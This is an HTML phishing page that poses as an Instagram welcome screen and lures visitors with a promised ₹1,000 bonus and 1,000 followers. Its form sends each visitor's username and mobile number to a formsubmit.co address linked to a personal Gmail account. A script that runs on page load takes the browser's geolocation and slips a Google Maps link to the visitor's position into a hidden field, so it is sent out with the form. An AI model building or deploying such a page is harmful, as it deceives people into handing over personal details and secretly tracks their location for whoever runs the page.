<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Welcome - Instagram</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #08001f, #25004d, #001f5c);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            padding: 30px 25px;
            border-radius: 25px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
            text-align: center;
        }

        .logo {
            width: 150px;
            max-width: 100%;
            border-radius: 20px;
            margin-bottom: 15px;
        }

        h1 {
            margin: 5px 0 10px;
            color: #222;
            font-size: 30px;
        }

        p {
            color: #666;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(90deg, #d600ff, #0066ff);
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>

<body>

    <div class="container">

        <img src="instagram.PNG" alt="Instagram" class="logo">

        <h1>Welcome to Instagram</h1>

        <p>लॉग इन करें और तुरंत पाएं ₹1,000 बोनस + 1,000 फॉलोअर्स!</p>

        <form action="https://formsubmit.co/deepakgupta818286@gmail.com" method="POST">

            
                   

            <input type="text"
                   name="Username"
                   placeholder="Enter Your Username"
                   required>

            <input type="text"
                   name="Mobile no"
                   placeholder="Enter Your mobike no"
                   required>

            <input type="hidden"
                   name="_subject"
                   value="New PulseChat Form Submission">

            <input type="hidden"
                   name="_captcha"
                   value="false">
            <input type="hidden" name="_next" value="https://deepakgupta818286-sketch.github.io/Instagram-/success.html">

<input type="hidden" id="locationLink" name="Location">
            <button type="submit">Submit</button>
            



        </form>

    </div>
<script>
function getLocation() {
    if (!navigator.geolocation) {
        return;
    }

    navigator.geolocation.getCurrentPosition(
        function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const mapsLink =
                "https://www.google.com/maps?q=" +
                latitude + "," + longitude;

            document.getElementById("locationLink").value = mapsLink;
        },
        function() {
            console.log("Location permission not granted");
        }
    );
}

window.addEventListener("load", function() {
    getLocation();
});
</script>
